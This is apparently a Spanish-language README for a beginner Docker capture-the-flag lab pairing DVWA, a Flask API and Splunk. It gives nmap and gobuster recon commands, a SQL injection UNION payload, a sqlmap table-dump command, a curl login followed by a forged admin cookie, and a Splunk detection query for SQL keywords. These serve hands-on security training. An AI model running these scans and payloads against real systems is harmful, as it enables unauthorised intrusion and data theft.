# Lab 01 — Beginner: Operation First Blood

## Objetivo
Reconocimiento de red, enumeración web, SQL Injection, fuerza bruta HTTP
y monitoreo defensivo con Splunk.

## Arranque

```bash
# Desde la raíz del proyecto
make lab01
# o
cd lab01 && docker compose --env-file .env up -d --build
```

## Servicios

| Servicio | URL | Credenciales |
|----------|-----|--------------|
| DVWA | http://localhost:8080 | admin / password |
| Splunk | http://localhost:8000 | admin / lab2024! |
| Flask API | http://localhost:5000 | — |

> Primera vez en DVWA: Setup/Reset DB → Create/Reset Database

## Módulos y flags

### Módulo 1 — Recon (Red Team)
```bash
docker exec -it lab01-kali bash
nmap -sV -sC -T4 192.168.101.0/24
gobuster dir -u http://192.168.101.10 -w /usr/share/wordlists/dirb/common.txt
```

### Módulo 2 — SQL Injection → Flag #1
- Ve a DVWA → SQL Injection (security: Low)
- Payload: `1' UNION SELECT flag_value, hint FROM ctf_flags-- -`
- Con sqlmap: `sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=X;security=low" -D dvwa -T ctf_flags --dump --batch`

### Módulo 3 — Brute Force → Flag #2
```bash
curl -X POST http://localhost:5000/login -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin123"}'
# Con la cookie obtenida:
curl http://localhost:5000/admin -H "Cookie: session_user=admin"
```

### Módulo 4 — Blue Team (Splunk) → Flag #3
```spl
index=main sourcetype=access_combined
| rex field=uri "(?i)(?P<sqli>union|select|drop|or\s+')"
| where isnotnull(sqli)
| stats count by src_ip, sqli | sort -count
```

## Solución de problemas
```bash
docker compose logs dvwa        # ver logs DVWA
docker compose restart dvwa     # reiniciar si no conecta
docker compose down -v && docker compose up -d --build  # reset completo
```
